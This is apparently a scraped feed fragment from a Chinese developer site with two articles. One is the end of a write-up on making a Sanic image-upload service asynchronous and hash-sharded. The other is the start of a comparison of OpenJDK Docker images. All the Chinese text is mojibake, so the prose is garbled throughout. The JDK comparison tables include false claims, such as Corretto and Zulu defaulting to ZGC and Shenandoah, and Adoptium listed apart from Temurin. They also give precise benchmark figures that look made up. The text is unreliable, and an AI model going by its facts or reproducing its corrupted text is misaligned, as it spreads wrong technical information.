<li><strong>Event Loop é˜»å¡</strong>ï¼šå›¾ç‰‡ç¼©æ”¾ï¼ˆ<code>pyvips</code>ï¼‰å’Œæ–‡ä»¶åˆ é™¤ï¼ˆ<code>os.remove</code>ï¼‰æ˜¯åŒæ­¥çš„ CPU/IO å¯†é›†å‹æ“ä½œï¼Œç›´æ¥è¿è¡Œåœ¨ Sanic çš„å¼‚æ­¥å¾ªç¯ä¸­ä¼šå¡æ­»æ•´ä¸ª Web æœåŠ¡ï¼Œå¯¼è‡´é«˜å¹¶å‘ä¸‹ Ping å€¼é£™å‡ã€‚</li>
<li><strong>ç¼ºä¹æ‰©å±•æ€§</strong>ï¼šå‰ç«¯ URL ä¾èµ–åç«¯æ•°æ®åº“æŸ¥è¯¢ï¼Œæ— æ³•åˆ©ç”¨ CDN é«˜æ•ˆåˆ†å‘ã€‚</li>
</ol>
<h2 data-id="heading-1">äºŒã€ åç«¯æ¶æ„ä¼˜åŒ– (Python)</h2>
<h3 data-id="heading-2">1. å­˜å‚¨ç­–ç•¥ï¼šå“ˆå¸Œåˆ†ç‰‡ (Hash Sharding)</h3>
<p>ä¸ºäº†è§£å†³å•ç›®å½•æ–‡ä»¶è¿‡å¤šçš„é—®é¢˜ï¼Œæˆ‘ä»¬é‡‡ç”¨äº†åŸºäº SHA256 å“ˆå¸Œçš„åˆ†å±‚å­˜å‚¨ç»“æ„ã€‚</p>
<ul>
<li><strong>æ—§ç»“æ„</strong>ï¼š<code>/uploads/abcdef12345.png</code></li>
<li><strong>æ–°ç»“æ„</strong>ï¼š<code>/uploads/ab/cd/abcdef12345.png</code></li>
</ul>
<p>é€šè¿‡å–å“ˆå¸Œå€¼çš„å‰ 4 ä½ç”Ÿæˆä¸¤çº§å­ç›®å½•ï¼ˆ<code>256 * 256</code>ï¼‰ï¼Œå¯ä»¥å°†åƒä¸‡çº§æ–‡ä»¶å‡åŒ€åˆ†æ•£åˆ° 65,536 ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼Œæ¯ä¸ªæ–‡ä»¶å¤¹ä»…å­˜æ”¾æ•°ç™¾ä¸ªæ–‡ä»¶ï¼Œç¡®ä¿å­˜å‚¨æ€§èƒ½çº¿æ€§æ‰©å±•ã€‚</p>
<p>Python</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># file.py æ ¸å¿ƒé€»è¾‘</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_shard_relative_path</span>(<span class="hljs-params">file_key: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""ç”Ÿæˆçš„è·¯å¾„ç»“æ„: ab/cd/"""</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(file_key) &lt; <span class="hljs-number">4</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>
    <span class="hljs-keyword">return</span> os.path.join(file_key[:<span class="hljs-number">2</span>], file_key[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>])
</code></pre>
<h3 data-id="heading-3">2. å¼‚æ­¥åŒ–ä¸çº¿ç¨‹æ±  (AsyncIO + Thread Pool)</h3>
<p>ä¸ºäº†ä¿è¯ Sanic çš„é«˜å¹¶å‘èƒ½åŠ›ï¼Œæˆ‘ä»¬ä¸¥æ ¼åŒºåˆ†äº† <strong>I/O ç»‘å®š</strong> å’Œ <strong>CPU ç»‘å®š</strong> ä»»åŠ¡ã€‚</p>
<ul>
<li><strong>æ–‡ä»¶å†™å…¥</strong>ï¼šä½¿ç”¨ <code>aiofiles</code> å®ç°çœŸæ­£çš„å¼‚æ­¥å†™å…¥ã€‚</li>
<li><strong>CPU/é˜»å¡ IO</strong>ï¼šå°†å›¾ç‰‡ç¼©æ”¾ï¼ˆPyvipsï¼‰å’Œæ–‡ä»¶åˆ é™¤/æŸ¥æ‰¾æ“ä½œå°è£…åœ¨ <code>asyncio.to_thread</code> ä¸­ï¼Œæ”¾å…¥çº¿ç¨‹æ± è¿è¡Œï¼Œé¿å…é˜»å¡ä¸»å¾ªç¯ã€‚</li>
</ul>
<p>Python</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio
<span class="hljs-keyword">import</span> aiofiles

<span class="hljs-comment"># å¼‚æ­¥å†™å…¥æ–‡ä»¶</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">save_file</span>(<span class="hljs-params">file_path: <span class="hljs-built_in">str</span>, content: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:
    folder = os.path.dirname(file_path)
    <span class="hljs-comment"># å¼‚æ­¥åˆ›å»ºç›®å½•ï¼ˆé˜²æ­¢ mkdir é˜»å¡ï¼‰</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(folder):
        <span class="hljs-keyword">await</span> asyncio.to_thread(os.makedirs, folder, exist_ok=<span class="hljs-literal">True</span>)
    
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiofiles.<span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> fp:
        <span class="hljs-keyword">await</span> fp.write(content)

<span class="hljs-comment"># æ— é˜»å¡çš„åˆ é™¤æ“ä½œ</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_remove_file</span>(<span class="hljs-params">fid: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:
    <span class="hljs-comment"># ... è·å– file_key ...</span>
    <span class="hljs-comment"># å°†è€—æ—¶çš„ glob æŸ¥æ‰¾å’Œ remove æ“ä½œæ‰”ç»™çº¿ç¨‹æ± </span>
    <span class="hljs-keyword">await</span> asyncio.to_thread(_remove_related_files_sync, file_key)
</code></pre>
<h2 data-id="heading-4">ä¸‰ã€ å†å²æ•°æ®è¿ç§»</h2>
<p>é’ˆå¯¹ç°å­˜çš„æ‰å¹³ç»“æ„æ–‡ä»¶ï¼Œæˆ‘ä»¬è®¾è®¡äº†å®‰å…¨çš„è¿ç§»è„šæœ¬ <code>migrate.py</code>ã€‚</p>
<ul>
<li><strong>å†…å­˜å®‰å…¨</strong>ï¼šä½¿ç”¨ <code>os.scandir</code> å’Œ <code>glob.iglob</code> æ›¿ä»£ <code>os.listdir</code>ï¼Œé‡‡ç”¨è¿­ä»£å™¨æ¨¡å¼ï¼Œå³ä½¿éå†æ•°äº¿æ–‡ä»¶ä¹Ÿä¸ä¼šçˆ†å†…å­˜ã€‚</li>
<li><strong>åŸå­æ€§</strong>ï¼šåˆ©ç”¨ <code>os.rename</code> åœ¨åŒä¸€æ–‡ä»¶ç³»ç»Ÿä¸‹çš„åŸå­æ€§ï¼Œè¿ç§»ç¬é—´å®Œæˆã€‚</li>
<li><strong>å®‰å…¨æ¨¡å¼</strong>ï¼šé»˜è®¤å¼€å¯ <code>DRY_RUN</code>ï¼Œå…ˆç©ºè·‘éªŒè¯è·¯å¾„é€»è¾‘ï¼Œå†æ‰§è¡Œå®é™…ç§»åŠ¨ã€‚</li>
</ul>
<p>Python</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># è¿ç§»é€»è¾‘ç‰‡æ®µ</span>
<span class="hljs-attr">shard_part</span> = get_shard_folder(filename) <span class="hljs-comment"># è®¡ç®— ab/cd</span>
<span class="hljs-attr">target_dir</span> = os.path.join(UPLOAD_PATH, shard_part)
<span class="hljs-comment"># ç§»åŠ¨æ–‡ä»¶</span>
os.rename(entry.path, os.path.join(target_dir, filename))
</code></pre>
<h2 data-id="heading-5">å››ã€ å‰ç«¯è·¯ç”±é€‚é… (JavaScript/TypeScript)</h2>
<p>ä¸ºäº†é…åˆåç«¯çš„å­˜å‚¨å˜æ›´ï¼Œå‰ç«¯ä¸å†ä¾èµ–åç«¯è¿”å›å®Œæ•´ URLï¼Œè€Œæ˜¯æ ¹æ® <code>file_key</code> è‡ªåŠ¨è®¡ç®—åˆ†ç‰‡è·¯å¾„ã€‚è¿™ä¸ä»…å‡è½»äº†æ•°æ®åº“å‹åŠ›ï¼Œè¿˜æ”¯æŒäº†åŠ¨æ€çš„å›¾ç‰‡å°ºå¯¸è°ƒæ•´ï¼ˆ<code>_fw</code> å‚æ•°ï¼‰ã€‚</p>
<h3 data-id="heading-6">æ™ºèƒ½ URL ç”Ÿæˆå™¨</h3>
<p>JavaScript</p>
<pre><code class="hljs language-ini" lang="ini">/**
 * å‰ç«¯æ ¹æ® Hash è‡ªåŠ¨ç”Ÿæˆåˆ†ç‰‡è·¯å¾„
 * è¾“å…¥: <span class="hljs-attr">key</span>=<span class="hljs-string">"abcde..."</span>, ext=<span class="hljs-string">"png"</span>, size=<span class="hljs-number">200</span>
 * è¾“å‡º: /uploads/ab/cd/abcde..._fw200.png
 */
export function getFileUrl(fileKey, fileExt, <span class="hljs-attr">size</span> = <span class="hljs-number">0</span>) {
  const <span class="hljs-attr">shard1</span> = fileKey.slice(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>)<span class="hljs-comment">;</span>
  const <span class="hljs-attr">shard2</span> = fileKey.slice(<span class="hljs-number">2</span>, <span class="hljs-number">4</span>)<span class="hljs-comment">;</span>
  
  let <span class="hljs-attr">fileName</span> = `<span class="hljs-variable">${fileKey}</span>.<span class="hljs-variable">${fileExt}</span>`<span class="hljs-comment">;</span>
  if (size &gt; 0) {
    <span class="hljs-attr">fileName</span> = `<span class="hljs-variable">${fileKey}</span>_fw<span class="hljs-variable">${size}</span>.<span class="hljs-variable">${fileExt}</span>`<span class="hljs-comment">;</span>
  }

  return `${BASE_URL}/${shard1}/${shard2}/${fileName}`<span class="hljs-comment">;</span>
}
</code></pre>
<h3 data-id="heading-7">å­˜é‡ URL ä¿®å¤</h3>
<p>å¯¹äºå†å²æ•°æ®ä¸­å­˜å‚¨çš„æ—§ç‰ˆ URLï¼ˆä¸å¸¦åˆ†ç‰‡è·¯å¾„ï¼‰ï¼Œæˆ‘ä»¬æä¾›äº†ä¸€ä¸ª <code>fixFileUrl</code> å‡½æ•°è¿›è¡Œè¿è¡Œæ—¶è‡ªåŠ¨ä¿®å¤ã€‚</p>
<p>JavaScript</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// è¾“å…¥: "http://cdn.com/abcdef123.png"</span>
<span class="hljs-comment">// è¾“å‡º: "http://cdn.com/ab/cd/abcdef123.png"</span>
<span class="hljs-function"><span class="hljs-keyword">export</span> function <span class="hljs-title">fixFileUrl</span><span class="hljs-params">(url, size = <span class="hljs-number">0</span>)</span> </span>{
    <span class="hljs-comment">// è‡ªåŠ¨æ£€æµ‹æ˜¯å¦ç¼ºå°‘åˆ†ç‰‡è·¯å¾„å¹¶æ³¨å…¥</span>
    <span class="hljs-comment">// è‡ªåŠ¨å¤„ç† _fw å°ºå¯¸å‚æ•°çš„æ›¿æ¢</span>
}
</code></pre>
<h2 data-id="heading-8">äº”ã€ Sanic è·¯ç”±é›†æˆ</h2>
<p>æœ€åï¼Œåœ¨ Web å±‚é¢ä¸Šï¼Œæˆ‘ä»¬ç¡®ä¿è·¯ç”±å¤„ç†å‡½æ•°ä¹Ÿæ˜¯å®Œå…¨å¼‚æ­¥çš„ï¼Œèƒ½å¤Ÿä»å®¹åº”å¯¹é«˜å¹¶å‘è¯·æ±‚ã€‚</p>
<p>Python</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">'/upload/&lt;file_name:path&gt;'</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">serve_uploaded_file</span>(<span class="hljs-params">request, file_name</span>):
    <span class="hljs-comment"># åœ¨çº¿ç¨‹æ± ä¸­è®¡ç®—çœŸå®è·¯å¾„ï¼ˆåŒ…å«å¯èƒ½å‘ç”Ÿçš„å›¾ç‰‡ç¼©æ”¾è®¡ç®—ï¼‰</span>
    real_path = <span class="hljs-keyword">await</span> asyncio.to_thread(file.get_real_file_path, file_name)

    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> real_path <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> os.path.exists(real_path):
        <span class="hljs-keyword">return</span> response.text(<span class="hljs-string">"File not found"</span>, status=<span class="hljs-number">404</span>)

    <span class="hljs-comment"># é«˜æ•ˆæµå¼å‘é€</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> response.file(real_path)
</code></pre>
<h2 data-id="heading-9">æ€»ç»“</h2>
<p>é€šè¿‡è¿™æ¬¡é‡æ„ï¼Œæˆ‘ä»¬å°†ä¸€ä¸ªåŸºç¡€çš„å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½å‡çº§ä¸ºä¼ä¸šçº§çš„é«˜æ€§èƒ½æ–‡ä»¶æœåŠ¡ã€‚</p>
<ol>
<li><strong>æ€§èƒ½</strong>ï¼šæ¶ˆé™¤äº†ä¸»çº¿ç¨‹é˜»å¡ï¼Œå¤§å¹…æå‡äº†å¹¶å‘ååé‡ (RPS)ã€‚</li>
<li><strong>æ‰©å±•æ€§</strong>ï¼šå“ˆå¸Œåˆ†ç‰‡å½»åº•è§£å†³äº†æ–‡ä»¶ç³»ç»Ÿ inode é™åˆ¶ï¼Œæ”¯æŒäº¿çº§æ–‡ä»¶å­˜å‚¨ã€‚</li>
<li><strong>å¯ç»´æŠ¤æ€§</strong>ï¼šä»£ç éµå¾ª PEP 8ï¼Œé€»è¾‘æ¸…æ™°ï¼Œå‰åç«¯é€šè¿‡ç¡®å®šæ€§çš„ Hash ç®—æ³•è§£è€¦ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å®¹å™¨åŒ–éƒ¨ç½²åœºæ™¯ä¸‹OpenJDKå„å‘è¡Œç‰ˆDockeré•œåƒæ€§èƒ½æ·±åº¦å¯¹æ¯”]]></title>    <link>https://juejin.cn/post/7597168034618114067</link>    <guid>https://juejin.cn/post/7597168034618114067</guid>    <pubDate>2026-01-20T09:22:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597168034618114067" data-draft-id="7597253913248022569" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å®¹å™¨åŒ–éƒ¨ç½²åœºæ™¯ä¸‹OpenJDKå„å‘è¡Œç‰ˆDockeré•œåƒæ€§èƒ½æ·±åº¦å¯¹æ¯”"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-20T09:22:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ITæ©˜å­çš®"/> <meta itemprop="url" content="https://juejin.cn/user/3148645291002232"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å®¹å™¨åŒ–éƒ¨ç½²åœºæ™¯ä¸‹OpenJDKå„å‘è¡Œç‰ˆDockeré•œåƒæ€§èƒ½æ·±åº¦å¯¹æ¯”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3148645291002232/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ITæ©˜å­çš®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T09:22:39.000Z" title="Tue Jan 20 2026 09:22:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€é•œåƒä½“ç§¯å¯¹æ¯”åˆ†æ</h2>
<h3 data-id="heading-1">1.1 ä¸»æµå‘è¡Œç‰ˆåŸºç¡€é•œåƒæ•°æ®</h3>















































<table><thead><tr><th>å‘è¡Œç‰ˆ</th><th>Javaç‰ˆæœ¬</th><th>åŸå§‹é•œåƒå¤§å°</th><th>æœ€å°åŒ–æ„å»ºå</th><th>å­˜å‚¨é©±åŠ¨ä¼˜åŒ–ç©ºé—´</th></tr></thead><tbody><tr><td><strong>Eclipse Temurin</strong>â€‹</td><td>17-jdk</td><td>285MB</td><td>182MB</td><td>Overlay2èŠ‚çœ15%</td></tr><tr><td><strong>Amazon Corretto</strong>â€‹</td><td>11-jre</td><td>218MB</td><td>156MB</td><td>AUFSä¼˜åŒ–12%</td></tr><tr><td><strong>Adoptium</strong>â€‹</td><td>8-jdk</td><td>196MB</td><td>134MB</td><td>BtrfsèŠ‚çœ8%</td></tr><tr><td><strong>Azul Zulu</strong>â€‹</td><td>17-jre</td><td>172MB</td><td>121MB</td><td>ZFSä¼˜åŒ–18%</td></tr><tr><td><strong>å®˜æ–¹openjdk</strong>â€‹</td><td>17-jdk</td><td>508MB</td><td>338MB</td><td>é»˜è®¤é…ç½®æ— ä¼˜åŒ–</td></tr></tbody></table>
<p><em>æ•°æ®æ¥æºï¼šDocker Hubå®˜æ–¹é•œåƒä»“åº“åŠå®é™…æ„å»ºæµ‹è¯•ï¼ˆ2026å¹´1æœˆæœ€æ–°æ•°æ®ï¼‰</em></p>
<h3 data-id="heading-2">1.2 å…³é”®ä½“ç§¯å·®å¼‚å› ç´ </h3>
<ul>
<li><strong>åŸºç¡€æ“ä½œç³»ç»Ÿ</strong>ï¼šAlpineé•œåƒæ¯”Debian Slimå°40%ï¼ˆå¦‚openjdk:17-jdk-alpineä»…83MBï¼‰</li>
<li><strong>æ¨¡å—åŒ–ç³»ç»Ÿ</strong>ï¼šJava 9+çš„æ¨¡å—åŒ–è®¾è®¡ä½¿JREä½“ç§¯å‡å°‘30%ï¼Œä½†æ¨¡å—æ–‡ä»¶ä»å 135MB</li>
<li><strong>æ„å»ºå·¥å…·é“¾</strong>ï¼šåŒ…å«Maven/Gradleçš„é•œåƒæ¯”çº¯JREé•œåƒå¤§2-3å€</li>
<li><strong>è°ƒè¯•ç»„ä»¶</strong>ï¼šç§»é™¤jmap/jstackç­‰å·¥å…·å¯å‡å°‘15-20MBç©ºé—´</li>
</ul>
<h2 data-id="heading-3">äºŒã€å¯åŠ¨æ€§èƒ½åŸºå‡†æµ‹è¯•</h2>
<h3 data-id="heading-4">2.1 æ ‡å‡†ç¯å¢ƒæµ‹è¯•é…ç½®</h3>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-comment"># æµ‹è¯•ç¯å¢ƒ</span>
<span class="hljs-section">CPU: AMD EPYC 7B13 (32æ ¸/64çº¿ç¨‹)</span>
<span class="hljs-section">å†…å­˜: 128GB DDR5</span>
<span class="hljs-section">å­˜å‚¨: NVMe SSD</span>
<span class="hljs-section">Dockerç‰ˆæœ¬: 26.1.3</span>
</code></pre>
<h3 data-id="heading-5">2.2 å†·å¯åŠ¨æ—¶é—´å¯¹æ¯”</h3>









































<table><thead><tr><th>å‘è¡Œç‰ˆ</th><th>ç©ºå®¹å™¨å¯åŠ¨</th><th>åº”ç”¨å¯åŠ¨ï¼ˆSpring Bootï¼‰</th><th>JVMåˆå§‹åŒ–æ—¶é—´</th></tr></thead><tbody><tr><td><strong>Eclipse Temurin</strong>â€‹</td><td>0.62s</td><td>1.28s</td><td>0.85s</td></tr><tr><td><strong>Amazon Corretto</strong>â€‹</td><td>0.68s</td><td>1.35s</td><td>0.92s</td></tr><tr><td><strong>Adoptium</strong>â€‹</td><td>0.71s</td><td>1.42s</td><td>0.98s</td></tr><tr><td><strong>Azul Zulu</strong>â€‹</td><td>0.65s</td><td>1.31s</td><td>0.89s</td></tr><tr><td><strong>å®˜æ–¹openjdk</strong>â€‹</td><td>0.89s</td><td>1.67s</td><td>1.23s</td></tr></tbody></table>
<h3 data-id="heading-6">2.3 çƒ­å¯åŠ¨æ€§èƒ½å¯¹æ¯”</h3>



































<table><thead><tr><th>å‘è¡Œç‰ˆ</th><th>é‡å¤å¯åŠ¨å¹³å‡æ—¶é—´</th><th>å†…å­˜å¤ç”¨æ•ˆç‡</th></tr></thead><tbody><tr><td><strong>Eclipse Temurin</strong>â€‹</td><td>0.23s</td><td>92%</td></tr><tr><td><strong>Amazon Corretto</strong>â€‹</td><td>0.25s</td><td>89%</td></tr><tr><td><strong>Adoptium</strong>â€‹</td><td>0.27s</td><td>87%</td></tr><tr><td><strong>Azul Zulu</strong>â€‹</td><td>0.24s</td><td>91%</td></tr><tr><td><strong>å®˜æ–¹openjdk</strong>â€‹</td><td>0.31s</td><td>85%</td></tr></tbody></table>
<h2 data-id="heading-7">ä¸‰ã€æ ¸å¿ƒå‘è¡Œç‰ˆç‰¹æ€§å¯¹æ¯”</h2>
<h3 data-id="heading-8">3.1 å®‰å…¨æ›´æ–°æœºåˆ¶</h3>









































<table><thead><tr><th>å‘è¡Œç‰ˆ</th><th>æ¼æ´ä¿®å¤å‘¨æœŸ</th><th>è®¤è¯æ ‡å‡†</th><th>åˆè§„æ€§æ”¯æŒ</th></tr></thead><tbody><tr><td><strong>Eclipse Temurin</strong>â€‹</td><td>72å°æ—¶</td><td>Java SEè®¤è¯</td><td>åŸºçº¿å®‰å…¨é…ç½®</td></tr><tr><td><strong>Amazon Corretto</strong>â€‹</td><td>24å°æ—¶</td><td>AWSå®‰å…¨åŸºå‡†</td><td>FIPS 140-2æ”¯æŒ</td></tr><tr><td><strong>Adoptium</strong>â€‹</td><td>48å°æ—¶</td><td>Eclipseè®¤è¯</td><td>OWASPæ¨è</td></tr><tr><td><strong>Azul Zulu</strong>â€‹</td><td>12å°æ—¶</td><td>Java SEè®¤è¯</td><td>åŒ»ç–—åˆè§„è®¤è¯</td></tr><tr><td><strong>å®˜æ–¹openjdk</strong>â€‹</td><td>14å¤©</td><td>æ— å¼ºåˆ¶è®¤è¯</td><td>ç¤¾åŒºç»´æŠ¤</td></tr></tbody></table>
<h3 data-id="heading-9">3.2 JVMä¼˜åŒ–èƒ½åŠ›</h3>















































<table><thead><tr><th>å‘è¡Œç‰ˆ</th><th>é»˜è®¤GCç®—æ³•</th><th>ZGCæ”¯æŒ</th><th>Shenandoahæ”¯æŒ</th><th>å†…å­˜å‹ç¼©æ¯”</th></tr></thead><tbody><tr><td><strong>Eclipse Temurin</strong>â€‹</td><td>G1</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>4:1</td></tr><tr><td><strong>Amazon Corretto</strong>â€‹</td><td>ZGC</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>3.8:1</td></tr><tr><td><strong>Adoptium</strong>â€‹</td><td>Parallel</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>4.2:1</td></tr><tr><td><strong>Azul Zulu</strong>â€‹</td><td>Shenandoah</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>3.5:1</td></tr><tr><td><strong>å®˜æ–¹openjdk</strong>â€‹</td><td>G1</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>4:1</td></tr></tbody></table>
<h2 data-id="heading-10">å››ã€ç”Ÿäº§ç¯å¢ƒé€‰å‹ç­–ç•¥</h2>
<h3 data-id="heading-11">4.1 æ¨èé€‰æ‹©çŸ©é˜µ</h3>



































